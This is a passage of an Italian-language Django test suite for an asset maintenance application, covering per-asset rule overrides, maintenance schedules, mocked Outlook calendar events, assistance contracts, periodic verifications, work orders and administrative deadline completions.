                "base_rule": str(self.base_rule.id),
                "override_threshold_type": MaintenanceRule.THRESHOLD_DAYS,
                "override_threshold_value": "120",
                "override_intervention_template": str(self.general_template.id),
                "is_disabled": "",
                "notes": "Intervallo aumentato per questo asset",
            },
        )

        self.assertEqual(response.status_code, 302)
        override = MaintenanceRuleAssetOverride.objects.get(asset=self.asset, base_rule=self.base_rule)
        self.assertEqual(override.override_threshold_type, MaintenanceRule.THRESHOLD_DAYS)
        self.assertEqual(override.override_threshold_value, 120)
        self.assertEqual(override.override_intervention_template, self.general_template)

    def test_override_form_rejects_rule_from_other_category(self):
        form = MaintenanceRuleAssetOverrideForm(
            data={
                "asset": str(self.asset.id),
                "base_rule": str(self.foreign_rule.id),
                "override_threshold_type": "",
                "override_threshold_value": "45",
                "override_intervention_template": "",
                "is_disabled": "",
                "notes": "",
            }
        )

        self.assertFalse(form.is_valid())
        self.assertIn("base_rule", form.errors)

    def test_override_form_rejects_override_template_from_other_category(self):
        form = MaintenanceRuleAssetOverrideForm(
            data={
                "asset": str(self.asset.id),
                "base_rule": str(self.base_rule.id),
                "override_threshold_type": MaintenanceRule.THRESHOLD_DAYS,
                "override_threshold_value": "45",
                "override_intervention_template": str(self.other_category_template.id),
                "is_disabled": "",
                "notes": "",
            }
        )

        self.assertFalse(form.is_valid())
        self.assertIn("override_intervention_template", form.errors)

    def test_resolve_asset_maintenance_rules_returns_inherited_status(self):
        rows = resolve_asset_maintenance_rules(self.asset)

        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["status"], "inherited")
        self.assertEqual(rows[0]["effective_threshold_type"], self.base_rule.threshold_type)
        self.assertEqual(rows[0]["effective_threshold_value"], self.base_rule.threshold_value)
        self.assertEqual(rows[0]["effective_intervention_template"], self.base_rule.intervention_template)

    def test_resolve_asset_maintenance_rules_returns_overridden_status(self):
        MaintenanceRuleAssetOverride.objects.create(
            asset=self.asset,
            base_rule=self.base_rule,
            override_threshold_value=150,
            override_intervention_template=self.general_template,
            notes="Override asset-specifico",
        )

        rows = resolve_asset_maintenance_rules(self.asset)

        self.assertEqual(rows[0]["status"], "overridden")
        self.assertEqual(rows[0]["effective_threshold_type"], self.base_rule.threshold_type)
        self.assertEqual(rows[0]["effective_threshold_value"], 150)
        self.assertEqual(rows[0]["effective_intervention_template"], self.general_template)
        self.assertEqual(rows[0]["effective_notes"], "Override asset-specifico")

    def test_resolve_asset_maintenance_rules_returns_disabled_status(self):
        MaintenanceRuleAssetOverride.objects.create(
            asset=self.asset,
            base_rule=self.base_rule,
            is_disabled=True,
            notes="Regola non applicabile a questo asset",
        )

        rows = resolve_asset_maintenance_rules(self.asset)

        self.assertEqual(rows[0]["status"], "disabled")
        self.assertTrue(rows[0]["is_disabled"])

    def test_asset_maintenance_routes_render_and_reset_override(self):
        override = MaintenanceRuleAssetOverride.objects.create(
            asset=self.asset,
            base_rule=self.base_rule,
            override_threshold_value=110,
            notes="Override da resettare",
        )
        self.client.force_login(self.admin)

        list_response = self.client.get(
            reverse("assets:asset_maintenance_rule_list", kwargs={"asset_id": self.asset.id})
        )
        self.assertEqual(list_response.status_code, 200)
        self.assertContains(list_response, "Regole manutenzione asset")
        self.assertContains(list_response, self.base_rule.intervention_template.label)
        self.assertContains(list_response, "Personalizzata")

        detail_response = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset.id}))
        self.assertEqual(detail_response.status_code, 200)
        self.assertContains(detail_response, "Regole manutenzione")

        reset_response = self.client.post(
            reverse(
                "assets:asset_maintenance_rule_override_reset",
                kwargs={"asset_id": self.asset.id, "id": override.id},
            )
        )
        self.assertEqual(reset_response.status_code, 302)
        self.assertFalse(MaintenanceRuleAssetOverride.objects.filter(pk=override.id).exists())

    def test_day_based_schedule_uses_manual_execution_state(self):
        today = timezone.localdate()
        AssetMaintenanceRuleState.objects.create(
            asset=self.asset,
            base_rule=self.base_rule,
            last_execution_date=today - timedelta(days=80),
            notes="Baseline manuale",
        )

        rows = build_day_based_maintenance_schedule_rows(
            asset_queryset=Asset.objects.filter(pk=self.asset.id).select_related("asset_category"),
            today=today,
        )

        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["schedule_status"], "warning")
        self.assertEqual(rows[0]["due_date"], today + timedelta(days=10))
        self.assertEqual(rows[0]["last_execution_notes"], "Baseline manuale")

    def test_asset_maintenance_rule_list_updates_execution_state(self):
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse("assets:asset_maintenance_rule_list", kwargs={"asset_id": self.asset.id}),
            {
                "action": "update_rule_execution",
                "base_rule_id": str(self.base_rule.id),
                "last_execution_date": "2026-03-01",
                "last_execution_notes": "Manutenzione straordinaria registrata a mano",
            },
        )

        self.assertEqual(response.status_code, 302)
        state = AssetMaintenanceRuleState.objects.get(asset=self.asset, base_rule=self.base_rule)
        self.assertEqual(str(state.last_execution_date), "2026-03-01")
        self.assertEqual(state.notes, "Manutenzione straordinaria registrata a mano")

    def test_maintenance_schedule_creates_outlook_event_for_selected_legacy_user(self):
        target_user = UtenteLegacy.objects.create(
            nome="Mario Rossi",
            email="m.rossi@example.local",
            password="hash-test",
            attivo=True,
        )
        AssetMaintenanceRuleState.objects.create(
            asset=self.asset,
            base_rule=self.base_rule,
            last_execution_date=date(2026, 1, 1),
            notes="Storico per calendario",
        )
        self.client.force_login(self.admin)

        with patch.object(
            asset_views,
            "_outlook_calendar_create_event",
            return_value={"id": "evt-123", "webLink": "https://outlook.office.com/calendar/item/evt-123"},
        ) as mocked_create:
            response = self.client.post(
                reverse("assets:maintenance_schedule"),
                {
                    "action": "create_outlook_calendar_event",
                    "asset_id": str(self.asset.id),
                    "base_rule_id": str(self.base_rule.id),
                    "target_legacy_user_id": str(target_user.id),
                    "filter_asset": str(self.asset.id),
                    "filter_status": "all",
                    "filter_category": "",
                    "filter_reparto": "",
                    "filter_coverage": "all",
                    "filter_q": "",
                },
            )

        self.assertEqual(response.status_code, 302)
        self.assertIn(f"asset={self.asset.id}", response["Location"])
        mocked_create.assert_called_once()
        self.assertEqual(mocked_create.call_args.kwargs["target_email"], "m.rossi@example.local")
        payload = mocked_create.call_args.kwargs["payload"]
        self.assertIn(self.asset.asset_tag, payload["subject"])
        self.assertIn(self.category_template.label, payload["subject"])
        self.assertEqual(payload["start"]["timeZone"], asset_views.OUTLOOK_CALENDAR_TIMEZONE)

        calendar_event = AssetCalendarEvent.objects.get(
            asset=self.asset,
            event_kind=AssetCalendarEvent.KIND_MAINTENANCE,
            maintenance_rule=self.base_rule,
            target_legacy_user_id=target_user.id,
        )
        self.assertEqual(calendar_event.target_email, "m.rossi@example.local")
        self.assertEqual(str(calendar_event.due_date), "2026-04-01")
        self.assertEqual(calendar_event.graph_event_id, "evt-123")

        with patch.object(asset_views, "_outlook_calendar_graph_ready", return_value=True):
            page_response = self.client.get(reverse("assets:maintenance_schedule") + f"?asset={self.asset.id}")
        self.assertEqual(page_response.status_code, 200)
        self.assertContains(page_response, "Crea evento Outlook")
        self.assertContains(page_response, "Evento Outlook")
        self.assertContains(page_response, "Mario Rossi")

    def test_maintenance_schedule_does_not_duplicate_existing_outlook_event(self):
        target_user = UtenteLegacy.objects.create(
            nome="Laura Bianchi",
            email="l.bianchi@example.local",
            password="hash-test",
            attivo=True,
        )
        AssetMaintenanceRuleState.objects.create(
            asset=self.asset,
            base_rule=self.base_rule,
            last_execution_date=date(2026, 1, 1),
        )
        source_key = asset_views._asset_calendar_source_key(
            event_kind=AssetCalendarEvent.KIND_MAINTENANCE,
            asset_id=self.asset.id,
            source_id=self.base_rule.id,
            due_date=date(2026, 4, 1),
            target_legacy_user_id=target_user.id,
        )
        AssetCalendarEvent.objects.create(
            asset=self.asset,
            event_kind=AssetCalendarEvent.KIND_MAINTENANCE,
            source_key=source_key,
            maintenance_rule=self.base_rule,
            due_date=date(2026, 4, 1),
            target_legacy_user_id=target_user.id,
            target_display_name="Laura Bianchi",
            target_email="l.bianchi@example.local",
            subject="Manutenzione esistente",
            transaction_id="existing-transaction",
            graph_event_id="evt-existing",
            graph_event_web_link="https://outlook.office.com/calendar/item/evt-existing",
            created_by=self.admin,
        )
        self.client.force_login(self.admin)

        with patch.object(asset_views, "_outlook_calendar_create_event") as mocked_create:
            response = self.client.post(
                reverse("assets:maintenance_schedule"),
                {
                    "action": "create_outlook_calendar_event",
                    "asset_id": str(self.asset.id),
                    "base_rule_id": str(self.base_rule.id),
                    "target_legacy_user_id": str(target_user.id),
                    "filter_asset": str(self.asset.id),
                    "filter_status": "all",
                    "filter_category": "",
                    "filter_reparto": "",
                    "filter_coverage": "all",
                    "filter_q": "",
                },
            )

        self.assertEqual(response.status_code, 302)
        mocked_create.assert_not_called()
        self.assertEqual(
            AssetCalendarEvent.objects.filter(
                asset=self.asset,
                event_kind=AssetCalendarEvent.KIND_MAINTENANCE,
                maintenance_rule=self.base_rule,
                target_legacy_user_id=target_user.id,
                due_date=date(2026, 4, 1),
            ).count(),
            1,
        )

    def test_administrative_deadline_list_creates_outlook_event_for_selected_legacy_user(self):
        target_user = UtenteLegacy.objects.create(
            nome="Giulia Verdi",
            email="g.verdi@example.local",
            password="hash-test",
            attivo=True,
        )
        deadline = AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_TECHNICAL,
            title="Revisione impianto",
            reference_code="REV-2026",
            issuer="INAIL",
            due_date=date(2026, 5, 20),
            warning_days=20,
        )
        self.client.force_login(self.admin)

        with patch.object(
            asset_views,
            "_outlook_calendar_create_event",
            return_value={"id": "evt-deadline", "webLink": "https://outlook.office.com/calendar/item/evt-deadline"},
        ) as mocked_create:
            response = self.client.post(
                reverse("assets:asset_administrative_deadline_list"),
                {
                    "action": "create_outlook_calendar_event",
                    "deadline_id": str(deadline.id),
                    "target_legacy_user_id": str(target_user.id),
                    "filter_asset": str(self.asset.id),
                    "filter_component": "",
                    "filter_deadline_type": "",
                    "filter_status": "all",
                    "filter_q": "",
                },
            )

        self.assertEqual(response.status_code, 302)
        self.assertIn(f"asset={self.asset.id}", response["Location"])
        mocked_create.assert_called_once()
        self.assertEqual(mocked_create.call_args.kwargs["target_email"], "g.verdi@example.local")
        payload = mocked_create.call_args.kwargs["payload"]
        self.assertIn(deadline.title, payload["subject"])

        calendar_event = AssetCalendarEvent.objects.get(
            asset=self.asset,
            event_kind=AssetCalendarEvent.KIND_ADMINISTRATIVE_DEADLINE,
            administrative_deadline=deadline,
            target_legacy_user_id=target_user.id,
        )
        self.assertEqual(calendar_event.target_email, "g.verdi@example.local")
        self.assertEqual(calendar_event.graph_event_id, "evt-deadline")

        with patch.object(asset_views, "_outlook_calendar_graph_ready", return_value=True):
            page_response = self.client.get(
                reverse("assets:asset_administrative_deadline_list") + f"?asset={self.asset.id}"
            )
        self.assertEqual(page_response.status_code, 200)
        self.assertContains(page_response, "Crea evento Outlook")
        self.assertContains(page_response, "Evento Outlook")
        self.assertContains(page_response, "Giulia Verdi")

    def test_periodic_verification_list_creates_outlook_event_for_selected_asset_context(self):
        target_user = UtenteLegacy.objects.create(
            nome="Paolo Neri",
            email="p.neri@example.local",
            password="hash-test",
            attivo=True,
        )
        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Verifiche",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        verification = PeriodicVerification.objects.create(
            name="Taratura annuale",
            supplier=supplier,
            frequency_months=12,
            next_verification_date=date(2026, 6, 15),
            created_by=self.admin,
        )
        verification.assets.add(self.asset)
        self.client.force_login(self.admin)

        with patch.object(
            asset_views,
            "_outlook_calendar_create_event",
            return_value={"id": "evt-periodic", "webLink": "https://outlook.office.com/calendar/item/evt-periodic"},
        ) as mocked_create:
            response = self.client.post(
                reverse("assets:periodic_verifications"),
                {
                    "action": "create_outlook_calendar_event",
                    "verification_id": str(verification.id),
                    "asset_id": str(self.asset.id),
                    "target_legacy_user_id": str(target_user.id),
                    "filter_asset": str(self.asset.id),
                    "filter_edit": "",
                },
            )

        self.assertEqual(response.status_code, 302)
        self.assertIn(f"asset={self.asset.id}", response["Location"])
        mocked_create.assert_called_once()
        self.assertEqual(mocked_create.call_args.kwargs["target_email"], "p.neri@example.local")
        payload = mocked_create.call_args.kwargs["payload"]
        self.assertIn(verification.name, payload["subject"])

        calendar_event = AssetCalendarEvent.objects.get(
            asset=self.asset,
            event_kind=AssetCalendarEvent.KIND_PERIODIC_VERIFICATION,
            periodic_verification=verification,
            target_legacy_user_id=target_user.id,
        )
        self.assertEqual(calendar_event.target_email, "p.neri@example.local")
        self.assertEqual(str(calendar_event.due_date), "2026-06-15")
        self.assertEqual(calendar_event.graph_event_id, "evt-periodic")

        with patch.object(asset_views, "_outlook_calendar_graph_ready", return_value=True):
            page_response = self.client.get(reverse("assets:periodic_verifications") + f"?asset={self.asset.id}&scope=production")
        self.assertEqual(page_response.status_code, 200)
        self.assertContains(page_response, "Crea evento Outlook")
        self.assertContains(page_response, "Evento Outlook")
        self.assertContains(page_response, "Paolo Neri")

    def test_assistance_contract_list_creates_outlook_event_for_selected_asset_context(self):
        target_user = UtenteLegacy.objects.create(
            nome="Sara Blu",
            email="s.blu@example.local",
            password="hash-test",
            attivo=True,
        )
        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Contratto Calendario",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        contract = AssistanceContract.objects.create(
            supplier=supplier,
            asset=self.asset,
            code="CTR-CAL",
            title="Contratto con promemoria",
            contract_type=AssistanceContract.TYPE_FULL_SERVICE,
            start_date=date(2026, 1, 1),
            end_date=date(2026, 12, 31),
            is_active=True,
            coverage_summary="Copertura standard",
        )
        self.client.force_login(self.admin)

        with patch.object(
            asset_views,
            "_outlook_calendar_create_event",
            return_value={"id": "evt-contract", "webLink": "https://outlook.office.com/calendar/item/evt-contract"},
        ) as mocked_create:
            response = self.client.post(
                reverse("assets:assistance_contract_list"),
                {
                    "action": "create_outlook_calendar_event",
                    "contract_id": str(contract.id),
                    "asset_id": str(self.asset.id),
                    "target_legacy_user_id": str(target_user.id),
                    "filter_asset": str(self.asset.id),
                    "filter_supplier": "",
                    "filter_state": "all",
                    "filter_scope": "all",
                    "filter_q": "",
                },
            )

        self.assertEqual(response.status_code, 302)
        self.assertIn(f"asset={self.asset.id}", response["Location"])
        mocked_create.assert_called_once()
        self.assertEqual(mocked_create.call_args.kwargs["target_email"], "s.blu@example.local")
        payload = mocked_create.call_args.kwargs["payload"]
        self.assertIn(contract.title, payload["subject"])

        calendar_event = AssetCalendarEvent.objects.get(
            asset=self.asset,
            event_kind=AssetCalendarEvent.KIND_ASSISTANCE_CONTRACT,
            assistance_contract=contract,
            target_legacy_user_id=target_user.id,
        )
        self.assertEqual(calendar_event.target_email, "s.blu@example.local")
        self.assertEqual(str(calendar_event.due_date), "2026-12-31")
        self.assertEqual(calendar_event.graph_event_id, "evt-contract")

        with patch.object(asset_views, "_outlook_calendar_graph_ready", return_value=True):
            page_response = self.client.get(reverse("assets:assistance_contract_list") + f"?asset={self.asset.id}")
        self.assertEqual(page_response.status_code, 200)
        self.assertContains(page_response, "Crea evento Outlook")
        self.assertContains(page_response, "Evento Outlook")
        self.assertContains(page_response, "Sara Blu")

    def test_assistance_contract_list_creates_contract_for_selected_asset(self):
        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Contratti Step 3",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse("assets:assistance_contract_list") + f"?asset={self.asset.id}",
            {
                "asset_id": str(self.asset.id),
                "action": "create_assistance_contract",
                "supplier": str(supplier.id),
                "asset_category": "",
                "code": "CTR-001",
                "title": "Contratto officina asset specifico",
                "contract_type": AssistanceContract.TYPE_FULL_SERVICE,
                "start_date": "2026-01-01",
                "end_date": "2026-12-31",
                "is_active": "on",
                "sla_description": "4h onsite",
                "coverage_summary": "Ricambi inclusi",
                "periodic_cost_eur": "450.00",
                "notes": "Contratto di prova",
                "document": "",
            },
        )

        self.assertEqual(response.status_code, 302)
        contract = AssistanceContract.objects.get(code="CTR-001")
        self.assertEqual(contract.asset, self.asset)
        self.assertEqual(contract.supplier, supplier)

    def test_assistance_contract_list_preserves_filters_after_post(self):
        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Redirect Filtri",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse("assets:assistance_contract_list")
            + f"?asset={self.asset.id}&state=active&scope=asset&q=ricambi",
            {
                "asset_id": str(self.asset.id),
                "action": "create_assistance_contract",
                "supplier": str(supplier.id),
                "asset_category": "",
                "code": "CTR-FILTER",
                "title": "Contratto con redirect filtrato",
                "contract_type": AssistanceContract.TYPE_FULL_SERVICE,
                "start_date": "2026-01-01",
                "end_date": "2026-12-31",
                "is_active": "on",
                "sla_description": "",
                "coverage_summary": "Ricambi inclusi",
                "periodic_cost_eur": "",
                "notes": "",
                "document": "",
            },
        )

        self.assertEqual(response.status_code, 302)
        self.assertIn(f"asset={self.asset.id}", response["Location"])
        self.assertIn("state=active", response["Location"])
        self.assertIn("scope=asset", response["Location"])
        self.assertIn("q=ricambi", response["Location"])

    def test_assistance_contract_list_shows_selected_asset_context_and_document_name(self):
        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Documento",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        self.client.force_login(self.admin)

        media_root = _make_workspace_tempdir("assets-contract-doc-")
        try:
            with override_settings(MEDIA_ROOT=media_root):
                document = FornitoreDocumento.objects.create(
                    fornitore=supplier,
                    nome="Contratto officina firmato",
                    tipo=FornitoreDocumento.TIPO_CONTRATTO,
                    file=SimpleUploadedFile("contratto.pdf", b"%PDF-1.4 test", content_type="application/pdf"),
                )
                AssistanceContract.objects.create(
                    supplier=supplier,
                    asset=self.asset,
                    title="Contratto con documento",
                    contract_type=AssistanceContract.TYPE_FULL_SERVICE,
                    start_date=timezone.localdate() - timedelta(days=5),
                    document=document,
                )

                response = self.client.get(reverse("assets:assistance_contract_list") + f"?asset={self.asset.id}")
        finally:
            shutil.rmtree(media_root, ignore_errors=True)

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Stai creando un contratto per questo asset")
        self.assertContains(response, document.nome)

    def test_new_schedule_and_contract_pages_render(self):
        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Render",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        AssistanceContract.objects.create(
            supplier=supplier,
            asset_category=self.category,
            title="Contratto categoria render",
            contract_type=AssistanceContract.TYPE_ON_CALL,
            start_date=timezone.localdate() - timedelta(days=5),
        )
        self.client.force_login(self.admin)

        schedule_response = self.client.get(reverse("assets:maintenance_schedule"))
        self.assertEqual(schedule_response.status_code, 200)
        self.assertContains(schedule_response, "Prossime manutenzioni")

        contracts_response = self.client.get(reverse("assets:assistance_contract_list"))
        self.assertEqual(contracts_response.status_code, 200)
        self.assertContains(contracts_response, "Contratti assistenza")

    def test_schedule_and_asset_detail_show_contextual_suggestions(self):
        self.client.force_login(self.admin)

        # status=all per includere le righe "senza storico" (la vista default "Attive" le nasconde)
        schedule_response = self.client.get(reverse("assets:maintenance_schedule") + f"?asset={self.asset.id}&status=all")
        self.assertEqual(schedule_response.status_code, 200)
        self.assertContains(schedule_response, "Imposta prima esecuzione")
        self.assertContains(schedule_response, "Verifica copertura")
        self.assertContains(schedule_response, "Prima esecuzione da pianificare")

        # La card "Suggerimenti operativi" è stata rimossa dal dettaglio asset
        # (ripulita UI): i suggerimenti contestuali restano sulla pagina scadenzario.
        detail_response = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset.id}))
        self.assertEqual(detail_response.status_code, 200)
        self.assertNotContains(detail_response, "Suggerimenti operativi")

    def test_reports_dashboard_links_all_open_workorders_and_missing_baseline_action(self):
        WorkOrder.objects.create(
            asset=self.asset,
            maintenance_rule=self.base_rule,
            kind=WorkOrder.KIND_PREVENTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="WO report aperto",
        )
        self.client.force_login(self.admin)

        response = self.client.get(reverse("assets:reports") + "?scope=production")

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Apri tutti gli aperti")
        self.assertContains(response, "?status=OPEN")
        self.assertContains(response, "Interventi aperti")
        self.assertContains(response, "Imposta prima esecuzione")

    def test_record_periodic_verification_execution_creates_workorder_and_advances_plan(self):
        from anagrafica.models import Fornitore

        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Cambio Olio",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        plan = PeriodicVerification.objects.create(
            name="Cambio olio",
            supplier=supplier,
            frequency_months=3,
            last_verification_date=date(2025, 11, 1),
            next_verification_date=date(2026, 2, 1),
            created_by=self.admin,
        )
        plan.assets.add(self.asset)
        self.client.force_login(self.admin)

        execution_date = date(2026, 4, 28)
        response = self.client.post(
            reverse("assets:periodic_verifications"),
            {
                "action": "record_periodic_verification_execution",
                "verification_id": str(plan.id),
                "execution_asset_id": str(self.asset.id),
                "execution_date": execution_date.isoformat(),
                "execution_duration_minutes": "45",
                "execution_cost_eur": "120,50",
                "execution_notes": "Sostituito olio idraulico, controllato livelli",
                "filter_asset": str(self.asset.id),
                "filter_scope": "production",
                "filter_window": "12",
            },
        )

        self.assertEqual(response.status_code, 302, response.content[:400])
        plan.refresh_from_db()
        self.assertEqual(plan.last_verification_date, execution_date)
        self.assertEqual(plan.next_verification_date, date(2026, 7, 28))

        wo = WorkOrder.objects.get(periodic_verification=plan, asset=self.asset)
        self.assertEqual(wo.status, WorkOrder.STATUS_DONE)
        self.assertEqual(wo.kind, WorkOrder.KIND_PREVENTIVE)
        self.assertEqual(wo.intervention_duration_minutes, 45)
        self.assertEqual(str(wo.cost_eur), "120.50")
        self.assertIn("olio idraulico", wo.resolution)
        self.assertEqual(wo.supplier_id, supplier.id)

    def test_record_maintenance_rule_execution_creates_workorder_and_updates_state(self):
        self.client.force_login(self.admin)

        execution_date = date(2026, 4, 20)
        response = self.client.post(
            reverse("assets:maintenance_schedule"),
            {
                "action": "record_maintenance_rule_execution",
                "asset_id": str(self.asset.id),
                "base_rule_id": str(self.base_rule.id),
                "execution_date": execution_date.isoformat(),
                "execution_duration_minutes": "30",
                "execution_cost_eur": "75",
                "execution_notes": "Lubrificazione completa guide e mandrino",
                "filter_asset": str(self.asset.id),
                "filter_status": "all",
            },
        )

        self.assertEqual(response.status_code, 302, response.content[:400])

        wo = WorkOrder.objects.get(maintenance_rule=self.base_rule, asset=self.asset)
        self.assertEqual(wo.status, WorkOrder.STATUS_DONE)
        self.assertEqual(wo.kind, WorkOrder.KIND_PREVENTIVE)
        self.assertEqual(wo.intervention_duration_minutes, 30)
        self.assertEqual(str(wo.cost_eur), "75.00")
        self.assertIn("Lubrificazione", wo.resolution)

        state = AssetMaintenanceRuleState.objects.get(asset=self.asset, base_rule=self.base_rule)
        self.assertEqual(state.last_execution_date, execution_date)
        self.assertEqual(state.last_work_order_id, wo.id)

        page = self.client.get(reverse("assets:maintenance_schedule"))
        self.assertEqual(page.status_code, 200)
        self.assertContains(page, "Esecuzioni recenti")
        self.assertContains(page, "Registra esecuzione")

    def test_record_periodic_verification_execution_supports_multi_asset_and_attachments(self):
        from anagrafica.models import Fornitore
        from django.core.files.uploadedfile import SimpleUploadedFile
        from .models import WorkOrderAttachment

        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Multi",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        second_asset = Asset.objects.create(
            name="Centro di lavoro ST3 Secondo",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=self.category,
            reparto="OFF",
            source_key="asset-step-three-second",
        )
        plan = PeriodicVerification.objects.create(
            name="Taratura mandrino",
            supplier=supplier,
            frequency_months=6,
            last_verification_date=date(2025, 11, 1),
            next_verification_date=date(2026, 5, 1),
            created_by=self.admin,
        )
        plan.assets.add(self.asset, second_asset)
        self.client.force_login(self.admin)

        execution_date = date(2026, 5, 3)
        attachment_file = SimpleUploadedFile(
            "verbale.pdf",
            b"%PDF-1.4 fake",
            content_type="application/pdf",
        )
        with patch("assets.views.validate_extension_and_mime", return_value="application/pdf"):
            response = self.client.post(
                reverse("assets:periodic_verifications"),
                {
                    "action": "record_periodic_verification_execution",
                    "verification_id": str(plan.id),
                    "execution_asset_ids": [str(self.asset.id), str(second_asset.id)],
                    "execution_date": execution_date.isoformat(),
                    "execution_duration_minutes": "60",
                    "execution_cost_eur": "200.00",
                    "execution_notes": "Taratura completata su entrambe le macchine",
                    "execution_files": [attachment_file],
                    "filter_asset": str(self.asset.id),
                    "filter_scope": "production",
                    "filter_window": "12",
                },
            )
        self.assertEqual(response.status_code, 302, response.content[:400])

        plan.refresh_from_db()
        self.assertEqual(plan.last_verification_date, execution_date)

        workorders = WorkOrder.objects.filter(periodic_verification=plan, asset__in=[self.asset, second_asset])
        self.assertEqual(workorders.count(), 2)
        for wo in workorders:
            self.assertEqual(wo.status, WorkOrder.STATUS_DONE)
            self.assertEqual(wo.attachments.count(), 1)
            attachment = wo.attachments.first()
            self.assertEqual(attachment.original_name, "verbale.pdf")

        total_attachments = WorkOrderAttachment.objects.filter(work_order__in=workorders).count()
        self.assertEqual(total_attachments, 2)

    def test_maintenance_schedule_lists_periodic_verifications(self):
        from anagrafica.models import Fornitore

        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Tarature",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        plan = PeriodicVerification.objects.create(
            name="Verifica manometri",
            supplier=supplier,
            frequency_months=12,
            last_verification_date=date(2025, 6, 1),
            next_verification_date=date(2026, 6, 1),
            created_by=self.admin,
        )
        plan.assets.add(self.asset)
        self.client.force_login(self.admin)

        page = self.client.get(reverse("assets:maintenance_schedule") + f"?asset={self.asset.id}")
        self.assertEqual(page.status_code, 200)
        self.assertContains(page, "Manutenzioni periodiche pianificate")
        self.assertContains(page, "Verifica manometri")
        expected_create_url = (
            reverse("assets:wo_create", args=[self.asset.id])
            + f"?periodic={plan.id}&source=maintenance_schedule"
        )
        periodic_row = next(row for row in page.context["periodic_schedule_rows"] if row["verification"].id == plan.id)
        self.assertEqual(periodic_row["workorder_create_url"], expected_create_url)
        self.assertContains(page, "Crea intervento")
        self.assertContains(page, "Apri piano")

        form_page = self.client.get(expected_create_url)
        self.assertEqual(form_page.status_code, 200)
        form = form_page.context["form"]
        self.assertEqual(int(form["periodic_verification"].value()), plan.id)
        self.assertEqual(form["kind"].value(), WorkOrder.KIND_PREVENTIVE)
        self.assertEqual(form["title"].value(), plan.name)
        self.assertEqual(int(form["supplier"].value()), supplier.id)

        create_response = self.client.post(
            expected_create_url,
            {
                "periodic_verification": str(plan.id),
                "maintenance_rule": "",
                "supplier": str(supplier.id),
                "assistance_contract": "",
                "kind": WorkOrder.KIND_PREVENTIVE,
                "status": WorkOrder.STATUS_OPEN,
                "title": plan.name,
                "description": "Controllo periodico programmato",
                "resolution": "",
                "downtime_minutes": "0",
                "assigned_to": "",
            },
        )
        self.assertEqual(create_response.status_code, 302, create_response.content[:400])
        workorder = WorkOrder.objects.get(periodic_verification=plan, asset=self.asset)
        self.assertEqual(workorder.origin, WorkOrder.ORIGIN_PERIODIC)
        self.assertEqual(workorder.supplier, supplier)

    def test_complete_administrative_deadline_with_next_due_renews_record(self):
        deadline = AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_REVISION,
            title="Revisione carroponte",
            due_date=date(2026, 4, 30),
            warning_days=30,
            is_active=True,
        )
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse("assets:asset_administrative_deadline_list"),
            {
                "action": "complete_administrative_deadline",
                "deadline_id": str(deadline.id),
                "execution_date": "2026-04-28",
                "execution_next_due": "2027-04-28",
                "execution_duration_minutes": "60",
                "execution_cost_eur": "350.00",
                "execution_notes": "Revisione completata, nuovo verbale archiviato",
            },
        )

        self.assertEqual(response.status_code, 302, response.content[:400])
        deadline.refresh_from_db()
        self.assertEqual(deadline.due_date, date(2027, 4, 28))
        self.assertTrue(deadline.is_active)

        completion = deadline.completions.get()
        self.assertEqual(completion.completed_on, date(2026, 4, 28))
        self.assertEqual(completion.next_due_date, date(2027, 4, 28))
        self.assertEqual(str(completion.cost_eur), "350.00")
        self.assertEqual(completion.duration_minutes, 60)
        self.assertEqual(completion.completed_by_id, self.admin.id)
        self.assertIn("verbale", completion.notes)

        page = self.client.get(reverse("assets:asset_administrative_deadline_list"))
        self.assertEqual(page.status_code, 200)
        self.assertContains(page, "Storico completamenti")
        self.assertContains(page, "Revisione carroponte")

    def test_complete_administrative_deadline_without_next_due_closes_record(self):
        deadline = AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_CERTIFICATE,
            title="Certificato CE provvisorio",
            due_date=date(2026, 5, 15),
            is_active=True,
        )
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse("assets:asset_administrative_deadline_list"),
            {
                "action": "complete_administrative_deadline",
                "deadline_id": str(deadline.id),
                "execution_date": "2026-04-15",
                "execution_cost_eur": "0",
                "execution_notes": "Sostituito da nuovo certificato CE2",
            },
        )

        self.assertEqual(response.status_code, 302)
        deadline.refresh_from_db()
        self.assertFalse(deadline.is_active)
        self.assertEqual(deadline.completions.count(), 1)

    def test_admin_deadline_completion_attachment_uses_private_download_route(self):
        deadline = AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            deadline_type=AssetAdministrativeDeadline.TYPE_CERTIFICATE,
            title="Verbale ISPESL",
            due_date=date(2026, 5, 15),
